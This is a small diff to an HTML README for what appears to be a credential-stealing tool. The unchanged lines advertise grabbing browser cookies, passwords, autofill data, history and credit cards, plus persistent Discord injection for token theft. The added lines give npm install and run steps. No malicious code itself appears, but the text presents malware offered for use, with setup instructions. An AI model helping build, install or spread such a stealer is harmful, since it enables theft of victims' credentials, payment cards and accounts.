@@ -13,6 +13,17 @@
     <li>Grab cookies/password/autofilldata/history/download/creditcards in all browser</li>
     <li>Discord injection permanante/grab tokens in all discord/browser</li>
   </ul>
+  
+    <br>
+
+  
+  <h3>Install</h3>
+  <ul>
+    <li>npm i</li>
+    <li>npm i in ./build/script</li>
+    <li>node inndex</li>
+  </ul>
+  
 
 
   <br>
